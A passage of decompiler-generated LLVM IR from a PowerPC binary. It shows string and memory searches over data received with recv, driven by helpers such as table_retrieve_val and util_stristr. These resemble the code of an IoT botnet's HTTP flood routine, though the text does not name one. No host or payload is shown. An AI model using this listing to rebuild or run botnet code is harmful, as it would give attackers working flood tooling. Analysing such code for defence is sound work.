  store i32 %v2_10001a98, i32* %r9.global-to-local, align 4
  %v1_10001a9c = add i32 %v2_10001a98, 10532
  %v2_10001a9c = inttoptr i32 %v1_10001a9c to i8*
  %v3_10001a9c = load i8, i8* %v2_10001a9c, align 1
  %v4_10001a9c = zext i8 %v3_10001a9c to i32
  store i32 %v4_10001a9c, i32* %r0.global-to-local, align 4
  %v1_10001aa0 = icmp ult i8 %v3_10001a9c, 32
  %v3_10001aa0 = icmp eq i8 %v3_10001a9c, 32
  store i1 %v1_10001aa0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001aa0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001aa0, label %dec_label_pc_10001cc0, label %dec_label_pc_10001aa8

dec_label_pc_10001aa8:                            ; preds = %dec_label_pc_10001a78, %dec_label_pc_10001cc0
  %v1_10001aac = phi i32 [ %v4_10001a90, %dec_label_pc_10001a78 ], [ %v1_10001cc0, %dec_label_pc_10001cc0 ]
  %v1_10001aa8 = load i32, i32* %r25.global-to-local, align 4
  %v2_10001aa8 = sub i32 %v1_10001aa8, %v1_10001a94
  store i32 %v2_10001aa8, i32* %r0.global-to-local, align 4
  %v0_10001aac = load i32, i32* %r31.global-to-local, align 4
  %v2_10001aac = add i32 %v0_10001aac, %v1_10001aac
  store i32 %v2_10001aac, i32* %r28.global-to-local, align 4
  %v2_10001ab0 = sub i32 %v2_10001aa8, %v1_10001aac
  store i32 %v2_10001ab0, i32* %r27.global-to-local, align 4
  %v0_10001ab4 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v2_10001aac, i32* %r3.global-to-local, align 4
  store i32 %v2_10001ab0, i32* %r4.global-to-local, align 4
  %v4_10001ac4 = call i32 @util_memsearch(i32 %v2_10001aac, i32 %v2_10001ab0, i32 %v0_10001ab4, i32 2)
  store i32 %v4_10001ac4, i32* %r3.global-to-local, align 4
  %v1_10001ac8 = icmp slt i32 %v4_10001ac4, -1
  %v3_10001ac8 = icmp eq i32 %v4_10001ac4, -1
  store i1 %v1_10001ac8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001ac8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v4_10001ac4, i32* %r31.global-to-local, align 4
  br i1 %v3_10001ac8, label %dec_label_pc_10001b70, label %dec_label_pc_10001ad4

dec_label_pc_10001ad4:                            ; preds = %dec_label_pc_10001aa8
  %v1_10001ad4 = icmp slt i32 %v4_10001ac4, 1
  %v3_10001ad4 = icmp eq i32 %v4_10001ac4, 1
  store i1 %v1_10001ad4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001ad4, i1* %cr7_eq.global-to-local, align 1
  %v0_10001ad8 = load i32, i32* %r20.global-to-local, align 4
  %v1_10001ad8 = load i32, i32* %r26.global-to-local, align 4
  %v2_10001ad8 = add i32 %v1_10001ad8, %v0_10001ad8
  store i32 %v2_10001ad8, i32* %r29.global-to-local, align 4
  %tmp126 = icmp slt i32 %v4_10001ac4, 2
  br i1 %tmp126, label %dec_label_pc_10001ae4, label %dec_label_pc_10001ae0

dec_label_pc_10001ae0:                            ; preds = %dec_label_pc_10001ad4
  %v1_10001ae0 = add i32 %v4_10001ac4, -2
  store i32 %v1_10001ae0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10001ae4

dec_label_pc_10001ae4:                            ; preds = %dec_label_pc_10001ad4, %dec_label_pc_10001ae0
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10001ae8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10001ae8, i32* %r3.global-to-local, align 4
  %v0_10001af0 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001af0, i32* %r4.global-to-local, align 4
  %v4_10001af8 = call i32 @util_memsearch(i32 %v0_10001ae8, i32 %v0_10001af0, i32 %v3_10001aec, i32 1)
  store i32 %v4_10001af8, i32* %r3.global-to-local, align 4
  %v1_10001afc = icmp slt i32 %v4_10001af8, 0
  %v3_10001afc = icmp eq i32 %v4_10001af8, 0
  store i1 %v1_10001afc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001afc, i1* %cr7_eq.global-to-local, align 1
  %tmp127 = icmp slt i32 %v4_10001af8, 1
  br i1 %tmp127, label %dec_label_pc_10001ae4.dec_label_pc_10001b20_crit_edge, label %dec_label_pc_10001b04

dec_label_pc_10001ae4.dec_label_pc_10001b20_crit_edge: ; preds = %dec_label_pc_10001ae4
  %v1_10001b28.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10001b20

dec_label_pc_10001b04:                            ; preds = %dec_label_pc_10001ae4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10001b08 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10001b08, i32* %r3.global-to-local, align 4
  %v0_10001b10 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001b10, i32* %r4.global-to-local, align 4
  %v4_10001b18 = call i32 @util_memsearch(i32 %v0_10001b08, i32 %v0_10001b10, i32 %v3_10001aec, i32 1)
  store i32 %v4_10001b18, i32* %r3.global-to-local, align 4
  %v1_10001b1c = add i32 %v4_10001b18, -1
  store i32 %v1_10001b1c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10001b20

dec_label_pc_10001b20:                            ; preds = %dec_label_pc_10001ae4.dec_label_pc_10001b20_crit_edge, %dec_label_pc_10001b04
  %v1_10001b28 = phi i32 [ %v1_10001b28.pre, %dec_label_pc_10001ae4.dec_label_pc_10001b20_crit_edge ], [ %v1_10001b1c, %dec_label_pc_10001b04 ]
  %v0_10001b20 = load i32, i32* %r21.global-to-local, align 4
  %v1_10001b20 = load i32, i32* %r26.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10001b20 = add i32 %v0_10001b20, %v1_10001b28
  %v2_10001b28 = add i32 %v2_10001b20, %v1_10001b20
  store i32 %v2_10001b28, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10001b30 = add i32 %v2_10001b28, 10532
  %v4_10001b30 = inttoptr i32 %v3_10001b30 to i8*
  store i8 0, i8* %v4_10001b30, align 1
  %v0_10001b34 = load i32, i32* %r4.global-to-local, align 4
  %v0_10001b50.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10001b50

dec_label_pc_10001b3c:                            ; preds = %dec_label_pc_10001b50
  br i1 %v3_10001b40, label %dec_label_pc_10001c6c, label %dec_label_pc_10001b48

dec_label_pc_10001b48:                            ; preds = %dec_label_pc_10001b3c
  %v1_10001b48 = add i32 %v3_10001b58, 1
  store i32 %v1_10001b48, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10001b50

dec_label_pc_10001b50:                            ; preds = %dec_label_pc_10001b20, %dec_label_pc_10001b48
  %v0_10001b50 = phi i32 [ %v0_10001b3c, %dec_label_pc_10001b48 ], [ %v0_10001b50.pre, %dec_label_pc_10001b20 ]
  %storemerge4 = phi i32 [ %v1_10001b48, %dec_label_pc_10001b48 ], [ %v0_10001b34, %dec_label_pc_10001b20 ]
  store i32 %storemerge4, i32* %stack_var_-20888, align 4
  store i32 %v0_10001b50, i32* %r3.global-to-local, align 4
  store i32 268442456, i32* @lr, align 4
  %v1_10001b54 = inttoptr i32 %v0_10001b50 to i8*
  %v2_10001b54 = call i32 @util_strlen(i8* %v1_10001b54)
  store i32 %v2_10001b54, i32* %r3.global-to-local, align 4
  %v3_10001b58 = load i32, i32* %stack_var_-20888, align 4
  store i32 %v3_10001b58, i32* %r31.global-to-local, align 4
  %v2_10001b5c = icmp slt i32 %v2_10001b54, %v3_10001b58
  %v3_10001b5c = icmp sgt i32 %v2_10001b54, %v3_10001b58
  %v4_10001b5c = icmp eq i32 %v2_10001b54, %v3_10001b58
  store i1 %v2_10001b5c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10001b5c, i1* %cr7_eq.global-to-local, align 1
  %v0_10001b3c = load i32, i32* %r29.global-to-local, align 4
  %v2_10001b3c = add i32 %v0_10001b3c, %v3_10001b58
  %v3_10001b3c = inttoptr i32 %v2_10001b3c to i8*
  %v4_10001b3c = load i8, i8* %v3_10001b3c, align 1
  %v5_10001b3c = zext i8 %v4_10001b3c to i32
  store i32 %v5_10001b3c, i32* %r0.global-to-local, align 4
  %v1_10001b40 = icmp ult i8 %v4_10001b3c, 61
  %v3_10001b40 = icmp eq i8 %v4_10001b3c, 61
  store i1 %v1_10001b40, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001b40, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001b5c, label %dec_label_pc_10001b3c, label %dec_label_pc_10001b64

dec_label_pc_10001b64:                            ; preds = %dec_label_pc_10001b50
  br i1 %v3_10001b40, label %dec_label_pc_10001c6c, label %dec_label_pc_10001b70

dec_label_pc_10001b70:                            ; preds = %dec_label_pc_10001c9c, %dec_label_pc_10001ccc, %dec_label_pc_10001b64, %dec_label_pc_10001aa8
  %v0_10001b70 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_10001b70, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10001b74

dec_label_pc_10001b74:                            ; preds = %dec_label_pc_10001cdc, %dec_label_pc_10001b70
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 46, i32* %r3.global-to-local, align 4
  %v3_10001b7c = call i32 @table_retrieve_val(i32 46, i32* null)
  %v0_10001b80 = load i32, i32* %r20.global-to-local, align 4
  %v1_10001b80 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001b80 = add i32 %v1_10001b80, %v0_10001b80
  store i32 %v2_10001b80, i32* %r31.global-to-local, align 4
  %v0_10001b88 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10001b88, i32* %r4.global-to-local, align 4
  store i32 %v2_10001b80, i32* %r3.global-to-local, align 4
  %v3_10001b90 = inttoptr i32 %v2_10001b80 to i8*
  %v4_10001b90 = call i32 @util_stristr(i8* %v3_10001b90, i32 %v0_10001b88, i32 %v3_10001b7c)
  store i32 %v4_10001b90, i32* %r3.global-to-local, align 4
  %v1_10001b94 = icmp slt i32 %v4_10001b90, -1
  %v3_10001b94 = icmp eq i32 %v4_10001b90, -1
  store i1 %v1_10001b94, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001b94, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001b94, label %dec_label_pc_10001b9c, label %dec_label_pc_10001a6c

dec_label_pc_10001b9c:                            ; preds = %dec_label_pc_10001b74, %dec_label_pc_10001a6c, %dec_label_pc_10001a40
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 45, i32* %r3.global-to-local, align 4
  %v3_10001ba4 = call i32 @table_retrieve_val(i32 45, i32* null)
  %v0_10001ba8 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10001ba8, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v4_10001bb4 = call i32 @util_stristr(i8* %v3_100017bc, i32 %v0_10001ba8, i32 %v3_10001ba4)
  store i32 %v4_10001bb4, i32* %r3.global-to-local, align 4
  %v1_10001bb8 = icmp slt i32 %v4_10001bb4, -1
  %v3_10001bb8 = icmp eq i32 %v4_10001bb4, -1
  store i1 %v1_10001bb8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001bb8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001bb8, label %dec_label_pc_10001df0, label %dec_label_pc_10001bc0

dec_label_pc_10001bc0:                            ; preds = %dec_label_pc_10001b9c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 45, i32* %r3.global-to-local, align 4
  %v3_10001bc8 = call i32 @table_retrieve_val(i32 45, i32* null)
  %v0_10001bcc = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10001bcc, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v4_10001bd8 = call i32 @util_stristr(i8* %v3_100017bc, i32 %v0_10001bcc, i32 %v3_10001bc8)
  store i32 %v4_10001bd8, i32* %r3.global-to-local, align 4
  %v0_10001bdc = load i32, i32* %r16.global-to-local, align 4
  %v0_10001be0 = load i32, i32* %r21.global-to-local, align 4
  %v2_10001be0 = add i32 %v0_10001be0, %v4_10001bd8
  store i32 %v2_10001be0, i32* %r9.global-to-local, align 4
  %v1_10001be8 = add i32 %v2_10001be0, 10532
  %v2_10001be8 = inttoptr i32 %v1_10001be8 to i8*
  %v3_10001be8 = load i8, i8* %v2_10001be8, align 1
  %v4_10001be8 = zext i8 %v3_10001be8 to i32
  store i32 %v4_10001be8, i32* %r0.global-to-local, align 4
  %v1_10001bec = xor i32 %v4_10001be8, 32
  %v1_10001bf0 = sub nsw i32 0, %v1_10001bec
  %v2_10001bf0 = xor i32 %v4_10001be8, -33
  %v4_10001bf0 = icmp uge i32 %v2_10001bf0, %v1_10001bf0
  %v2_10001bf4 = zext i1 %v4_10001bf0 to i32
  %v3_10001bf4 = add i32 %v2_10001bf4, %v4_10001bd8
  store i32 %v3_10001bf4, i32* %r9.global-to-local, align 4
  %v0_10001bf8 = load i32, i32* %r20.global-to-local, align 4
  %v2_10001bf8 = add i32 %v3_10001bf4, %v0_10001bf8
  store i32 %v2_10001bf8, i32* %r29.global-to-local, align 4
  store i32 %v2_10001bf8, i32* %r3.global-to-local, align 4
  %v1_10001c00 = load i32, i32* %r25.global-to-local, align 4
  %v2_10001c00 = sub i32 %v1_10001c00, %v3_10001bf4
  store i32 %v2_10001c00, i32* %r4.global-to-local, align 4
  store i32 %v3_10001bf4, i32* %r31.global-to-local, align 4
  %v4_10001c08 = call i32 @util_memsearch(i32 %v2_10001bf8, i32 %v2_10001c00, i32 %v0_10001bdc, i32 2)
  store i32 %v4_10001c08, i32* %r3.global-to-local, align 4
  %v1_10001c0c = icmp slt i32 %v4_10001c08, -1
  %v3_10001c0c = icmp eq i32 %v4_10001c08, -1
  store i1 %v1_10001c0c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001c0c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001c0c, label %dec_label_pc_10001df0, label %dec_label_pc_10001c14

dec_label_pc_10001c14:                            ; preds = %dec_label_pc_10001bc0
  %v1_10001c14 = icmp slt i32 %v4_10001c08, 1
  %v3_10001c14 = icmp eq i32 %v4_10001c08, 1
  store i1 %v1_10001c14, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001c14, i1* %cr7_eq.global-to-local, align 1
  %tmp128 = icmp slt i32 %v4_10001c08, 2
  br i1 %tmp128, label %dec_label_pc_10001c20, label %dec_label_pc_10001c1c

dec_label_pc_10001c1c:                            ; preds = %dec_label_pc_10001c14
  %v1_10001c1c = add i32 %v4_10001c08, -2
  store i32 %v1_10001c1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001c20

dec_label_pc_10001c20:                            ; preds = %dec_label_pc_10001c14, %dec_label_pc_10001c1c
  %v0_10001c30 = phi i32 [ %v4_10001c08, %dec_label_pc_10001c14 ], [ %v1_10001c1c, %dec_label_pc_10001c1c ]
  %v0_10001c20 = load i32, i32* %r21.global-to-local, align 4
  %v2_10001c20 = add i32 %v0_10001c20, %v0_10001c30
  store i32 268500992, i32* %r11.global-to-local, align 4
  %v1_10001c28 = load i32, i32* %r31.global-to-local, align 4
  %v2_10001c28 = add i32 %v2_10001c20, %v1_10001c28
  store i32 %v2_10001c28, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10001c30 = add i32 %v0_10001c30, 1
  store i32 %v1_10001c30, i32* %r28.global-to-local, align 4
  %v3_10001c38 = add i32 %v2_10001c28, 10532
  %v4_10001c38 = inttoptr i32 %v3_10001c38 to i8*
  store i8 0, i8* %v4_10001c38, align 1
  %v0_10001c3c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001c3c, i32* %r3.global-to-local, align 4
  %v0_10001c40 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10001c40, i32* %r4.global-to-local, align 4
  %v5_10001c48 = call i32 @util_memsearch(i32 %v0_10001c3c, i32 %v0_10001c40, i32 ptrtoint ([5 x i8]* @global_var_100100f0.21 to i32), i32 4)
  store i32 %v5_10001c48, i32* %r3.global-to-local, align 4
  %v1_10001c4c = icmp slt i32 %v5_10001c48, 4
  %v3_10001c4c = icmp eq i32 %v5_10001c48, 4
  store i1 %v1_10001c4c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001c4c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001c4c, label %dec_label_pc_100020e0, label %dec_label_pc_10001c54

dec_label_pc_10001c54:                            ; preds = %dec_label_pc_10001c20
  %v0_10001c54 = load i32, i32* %r20.global-to-local, align 4
  %v1_10001c54 = load i32, i32* %r31.global-to-local, align 4
  %v2_10001c54 = add i32 %v1_10001c54, %v0_10001c54
  %v3_10001c54 = inttoptr i32 %v2_10001c54 to i8*
  %v4_10001c54 = load i8, i8* %v3_10001c54, align 1
  %v5_10001c54 = zext i8 %v4_10001c54 to i32
  store i32 %v5_10001c54, i32* %r0.global-to-local, align 4
  %v1_10001c58 = icmp ult i8 %v4_10001c54, 47
  %v3_10001c58 = icmp eq i8 %v4_10001c54, 47
  store i1 %v1_10001c58, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001c58, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001c58, label %dec_label_pc_10001d08, label %dec_label_pc_10001c60

dec_label_pc_10001c60:                            ; preds = %dec_label_pc_10001570, %dec_label_pc_10002190, %dec_label_pc_10002178, %dec_label_pc_10001d30, %dec_label_pc_10001d08, %dec_label_pc_10001c54
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10001c64 = load i32, i32* @r30, align 4
  %v3_10001c64 = add i32 %v2_10001c64, 4
  %v4_10001c64 = inttoptr i32 %v3_10001c64 to i8*
  store i8 1, i8* %v4_10001c64, align 1
  br label %dec_label_pc_10001038

dec_label_pc_10001c6c:                            ; preds = %dec_label_pc_10001b3c, %dec_label_pc_10001b64
  %v0_10001c6c = load i32, i32* @r30, align 4
  %v1_10001c6c = add i32 %v0_10001c6c, 1468
  %v2_10001c6c = inttoptr i32 %v1_10001c6c to i32*
  %v3_10001c6c = load i32, i32* %v2_10001c6c, align 4
  store i32 %v3_10001c6c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-20888, align 4
  %v1_10001c78 = icmp slt i32 %v3_10001c6c, 0
  %v2_10001c78 = icmp sgt i32 %v3_10001c6c, 0
  %v3_10001c78 = icmp eq i32 %v3_10001c6c, 0
  store i1 %v1_10001c78, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001c78, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001c78, label %dec_label_pc_10001c9c, label %dec_label_pc_10001ccc

dec_label_pc_10001c84:                            ; preds = %dec_label_pc_10001c9c
  %v3_10001c84 = load i32, i32* %stack_var_-20888, align 4
  store i32 %v3_10001c84, i32* %r9.global-to-local, align 4
  %v0_10001c88 = load i32, i32* @r30, align 4
  %v1_10001c88 = add i32 %v0_10001c88, 1468
  %v2_10001c88 = inttoptr i32 %v1_10001c88 to i32*
  %v3_10001c88 = load i32, i32* %v2_10001c88, align 4
  store i32 %v3_10001c88, i32* %r0.global-to-local, align 4
  %v1_10001c8c = add i32 %v3_10001c84, 1
  store i32 %v1_10001c8c, i32* %r4.global-to-local, align 4
  %v2_10001c90 = icmp slt i32 %v3_10001c88, %v1_10001c8c
  %v3_10001c90 = icmp sgt i32 %v3_10001c88, %v1_10001c8c
  %v4_10001c90 = icmp eq i32 %v3_10001c88, %v1_10001c8c
  store i1 %v2_10001c90, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10001c90, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10001c8c, i32* %stack_var_-20888, align 4
  %v0_10001ca0.pre = load i32, i32* %r29.global-to-local, align 4
  br i1 %v3_10001c90, label %dec_label_pc_10001c84.dec_label_pc_10001c9c_crit_edge, label %dec_label_pc_10001ccc

dec_label_pc_10001c84.dec_label_pc_10001c9c_crit_edge: ; preds = %dec_label_pc_10001c84
  %v0_10001ca8.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10001c9c

dec_label_pc_10001c9c:                            ; preds = %dec_label_pc_10001c6c, %dec_label_pc_10001c84.dec_label_pc_10001c9c_crit_edge
  %v0_10001cac = phi i32 [ %v0_10001c88, %dec_label_pc_10001c84.dec_label_pc_10001c9c_crit_edge ], [ %v0_10001c6c, %dec_label_pc_10001c6c ]
  %v0_10001ca8 = phi i32 [ %v0_10001ca8.pre, %dec_label_pc_10001c84.dec_label_pc_10001c9c_crit_edge ], [ %v3_10001b58, %dec_label_pc_10001c6c ]
  %v0_10001ca0 = phi i32 [ %v0_10001ca0.pre, %dec_label_pc_10001c84.dec_label_pc_10001c9c_crit_edge ], [ %v0_10001b3c, %dec_label_pc_10001c6c ]
  %v0_10001c9c = phi i32 [ %v1_10001c8c, %dec_label_pc_10001c84.dec_label_pc_10001c9c_crit_edge ], [ 0, %dec_label_pc_10001c6c ]
  %v1_10001c9c = mul i32 %v0_10001c9c, 128
  store i32 %v0_10001ca0, i32* %r3.global-to-local, align 4
  %v1_10001ca4 = add i32 %v0_10001cac, 1472
  %v2_10001cac = add i32 %v1_10001ca4, %v1_10001c9c
  store i32 %v2_10001cac, i32* %r4.global-to-local, align 4
  %v3_10001cb0 = inttoptr i32 %v0_10001ca0 to i8*
  %v4_10001cb0 = call i32 @util_strncmp(i8* %v3_10001cb0, i32 %v2_10001cac, i32 %v0_10001ca8)
  store i32 %v4_10001cb0, i32* %r3.global-to-local, align 4
  %v1_10001cb4 = icmp slt i32 %v4_10001cb0, 0
  %v3_10001cb4 = icmp eq i32 %v4_10001cb0, 0
  store i1 %v1_10001cb4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001cb4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001cb4, label %dec_label_pc_10001c84, label %dec_label_pc_10001b70

dec_label_pc_10001cc0:                            ; preds = %dec_label_pc_10001a78
  %v1_10001cc0 = add i32 %v4_10001a90, 1
  store i32 %v1_10001cc0, i32* %r3.global-to-local, align 4
  %v2_10001cc4 = add i32 %v1_10001a94, %v1_10001cc0
  store i32 %v2_10001cc4, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10001aa8

dec_label_pc_10001ccc:                            ; preds = %dec_label_pc_10001c84, %dec_label_pc_10001c6c
  %v0_10001ccc = phi i32 [ %v0_10001b3c, %dec_label_pc_10001c6c ], [ %v0_10001ca0.pre, %dec_label_pc_10001c84 ]
  store i32 %v0_10001ccc, i32* %r3.global-to-local, align 4
  store i32 268442836, i32* @lr, align 4
  %v1_10001cd0 = inttoptr i32 %v0_10001ccc to i8*
  %v2_10001cd0 = call i32 @util_strlen(i8* %v1_10001cd0)
  store i32 %v2_10001cd0, i32* %r3.global-to-local, align 4
  %v1_10001cd4 = icmp slt i32 %v2_10001cd0, 127
  %v2_10001cd4 = icmp sgt i32 %v2_10001cd0, 127
  %v3_10001cd4 = icmp eq i32 %v2_10001cd0, 127
  store i1 %v1_10001cd4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001cd4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001cd4, label %dec_label_pc_10001b70, label %dec_label_pc_10001cdc

dec_label_pc_10001cdc:                            ; preds = %dec_label_pc_10001ccc
  %v0_10001cdc = load i32, i32* @r30, align 4
  %v1_10001cdc = add i32 %v0_10001cdc, 1468
  %v2_10001cdc = inttoptr i32 %v1_10001cdc to i32*
  %v3_10001cdc = load i32, i32* %v2_10001cdc, align 4
  %v0_10001ce0 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001ce0, i32* %r4.global-to-local, align 4
  %v0_10001ce4 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_10001ce4, i32* %r29.global-to-local, align 4
  %v1_10001ce8 = mul i32 %v3_10001cdc, 128
  %v1_10001cec = add i32 %v0_10001cdc, 1472
  %v2_10001cf0 = add i32 %v1_10001cec, %v1_10001ce8
  store i32 %v2_10001cf0, i32* @r3, align 4
  %v2_10001cf4 = inttoptr i32 %v2_10001cf0 to i8*
  %v3_10001cf4 = call i32 @util_strcpy(i8* %v2_10001cf4, i32 %v0_10001ce0)
  store i32 %v3_10001cf4, i32* %r3.global-to-local, align 4
  %v0_10001cf8 = load i32, i32* @r30, align 4
  %v1_10001cf8 = add i32 %v0_10001cf8, 1468
  %v2_10001cf8 = inttoptr i32 %v1_10001cf8 to i32*
  %v3_10001cf8 = load i32, i32* %v2_10001cf8, align 4
  %v1_10001cfc = add i32 %v3_10001cf8, 1
  store i32 %v1_10001cfc, i32* %r9.global-to-local, align 4
  store i32 %v1_10001cfc, i32* %v2_10001cf8, align 4
  br label %dec_label_pc_10001b74

dec_label_pc_10001d08:                            ; preds = %dec_label_pc_10001c54
  %v0_10001d08 = load i32, i32* @r30, align 4
  %v1_10001d08 = add i32 %v0_10001d08, 533
  store i32 %v1_10001d08, i32* %r28.global-to-local, align 4
  store i32 255, i32* @r4, align 4
  store i32 %v1_10001d08, i32* @r3, align 4
  %v0_10001d14 = load i32, i32* %r29.global-to-local, align 4
  %v1_10001d14 = add i32 %v0_10001d14, 1
  store i32 %v1_10001d14, i32* %r31.global-to-local, align 4
  store i32 268442908, i32* @lr, align 4
  %v0_10001d18 = call i32 @util_zero()
  %v3_10001d1c = load i32, i32* %stack_var_-20888, align 4
  %v0_10001d20 = load i32, i32* %r31.global-to-local, align 4
  %v2_10001d20 = add i32 %v0_10001d20, %v3_10001d1c
  store i32 %v2_10001d20, i32* %r3.global-to-local, align 4
  store i32 268442920, i32* @lr, align 4
  %v1_10001d24 = inttoptr i32 %v2_10001d20 to i8*
  %v2_10001d24 = call i32 @util_strlen(i8* %v1_10001d24)
  store i32 %v2_10001d24, i32* %r3.global-to-local, align 4
  %v1_10001d28 = icmp slt i32 %v2_10001d24, 0
  %v3_10001d28 = icmp eq i32 %v2_10001d24, 0
  store i1 %v1_10001d28, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001d28, i1* %cr7_eq.global-to-local, align 1
  %tmp129 = icmp slt i32 %v2_10001d24, 1
  br i1 %tmp129, label %dec_label_pc_10001c60, label %dec_label_pc_10001d30

dec_label_pc_10001d30:                            ; preds = %dec_label_pc_10001d08
  %v3_10001d30 = load i32, i32* %stack_var_-20888, align 4
  %v0_10001d34 = load i32, i32* %r31.global-to-local, align 4
  %v2_10001d34 = add i32 %v0_10001d34, %v3_10001d30
  store i32 %v2_10001d34, i32* %r3.global-to-local, align 4
  store i32 268442940, i32* @lr, align 4
  %v1_10001d38 = inttoptr i32 %v2_10001d34 to i8*
  %v2_10001d38 = call i32 @util_strlen(i8* %v1_10001d38)
  store i32 %v2_10001d38, i32* %r3.global-to-local, align 4
  %v1_10001d3c = icmp slt i32 %v2_10001d38, 255
  %v2_10001d3c = icmp sgt i32 %v2_10001d38, 255
  %v3_10001d3c = icmp eq i32 %v2_10001d38, 255
  store i1 %v1_10001d3c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001d3c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001d3c, label %dec_label_pc_10001c60, label %dec_label_pc_10001d44

dec_label_pc_10001d44:                            ; preds = %dec_label_pc_10001d30
  %v3_10001d44 = load i32, i32* %stack_var_-20888, align 4
  %v0_10001d48 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10001d48, i32* @r3, align 4
  %v0_10001d4c = load i32, i32* %r31.global-to-local, align 4
  %v2_10001d4c = add i32 %v0_10001d4c, %v3_10001d44
  store i32 %v2_10001d4c, i32* %r4.global-to-local, align 4
  %v2_10001d50 = inttoptr i32 %v0_10001d48 to i8*
  %v3_10001d50 = call i32 @util_strcpy(i8* %v2_10001d50, i32 %v2_10001d4c)
  store i32 %v3_10001d50, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10001d58 = load i32, i32* @r30, align 4
  %v3_10001d58 = add i32 %v2_10001d58, 4
  %v4_10001d58 = inttoptr i32 %v3_10001d58 to i8*
  store i8 1, i8* %v4_10001d58, align 1
  br label %dec_label_pc_10001038

dec_label_pc_10001d60:                            ; preds = %dec_label_pc_10001030
  %v0_10001d60 = call i32 @__GI___errno_location()
  store i32 %v0_10001d60, i32* %r3.global-to-local, align 4
  store i32 %v0_10001d60, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10001d68

dec_label_pc_10001d68:                            ; preds = %dec_label_pc_10001d8c, %dec_label_pc_10001d60
  %v1_10001d70 = phi i32 [ %v0_10001d60, %dec_label_pc_10001d60 ], [ %v0_10001d94, %dec_label_pc_10001d8c ]
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r4.global-to-local, align 4
  %v2_10001d70 = inttoptr i32 %v1_10001d70 to i32*
  store i32 0, i32* %v2_10001d70, align 4
  %v0_10001d7c = load i32, i32* @r30, align 4
  %v1_10001d7c = inttoptr i32 %v0_10001d7c to i32*
  %v2_10001d7c = load i32, i32* %v1_10001d7c, align 4
  store i32 %v2_10001d7c, i32* %r3.global-to-local, align 4
  store i32 268443012, i32* @lr, align 4
  %v4_10001d80 = call i32 @__libc_recv(i32 %v2_10001d7c, i32 %v2_10000a9c, i32 10240, i32 16384)
  store i32 %v4_10001d80, i32* %r3.global-to-local, align 4
  %v3_10001d84 = icmp eq i32 %v4_10001d80, 0
  br i1 %v3_10001d84, label %dec_label_pc_10002044, label %dec_label_pc_10001d8c

